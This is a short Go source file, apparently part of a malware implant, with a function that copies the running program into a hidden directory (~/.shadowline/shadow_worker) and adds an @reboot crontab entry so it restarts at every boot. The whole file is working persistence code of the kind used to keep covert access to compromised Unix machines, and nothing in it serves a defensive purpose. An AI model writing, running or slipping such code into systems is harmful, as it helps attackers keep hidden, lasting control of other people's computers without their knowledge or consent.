//go:build !windows

package main

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
)

const (
	HiddenDir  = ".shadowline"
	HiddenName = "shadow_worker"
)

func installPersistence() {
	// 1. Get current executable path
	exePath, err := os.Executable()
	if err != nil {
		return
	}

	// 2. Define target path (~/.shadowline/shadow_worker)
	homeDir, _ := os.UserHomeDir()
	targetDir := filepath.Join(homeDir, HiddenDir)
	targetPath := filepath.Join(targetDir, HiddenName)

	// 3. Check if running from target
	if exePath == targetPath {
		return
	}

	// 4. Create hidden directory
	if _, err := os.Stat(targetDir); os.IsNotExist(err) {
		os.MkdirAll(targetDir, 0755)
	}

	// 5. Copy self (using cp command for simplicity on unix)
	exec.Command("cp", exePath, targetPath).Run()
	exec.Command("chmod", "+x", targetPath).Run()

	// 6. Add to Crontab (@reboot)
	// We read existing cron, append our line, and save it back.
	job := fmt.Sprintf("@reboot %s", targetPath)

	// Check if already in crontab
	checkCmd := exec.Command("crontab", "-l")
	output, _ := checkCmd.Output()

	if !strings.Contains(string(output), targetPath) {
		// Append new job
		newCron := string(output) + "\n" + job + "\n"

		cmd := exec.Command("crontab", "-")
		cmd.Stdin = strings.NewReader(newCron)
		cmd.Run()

		fmt.Println("[*] Persistence installed via Crontab.")
	}
}
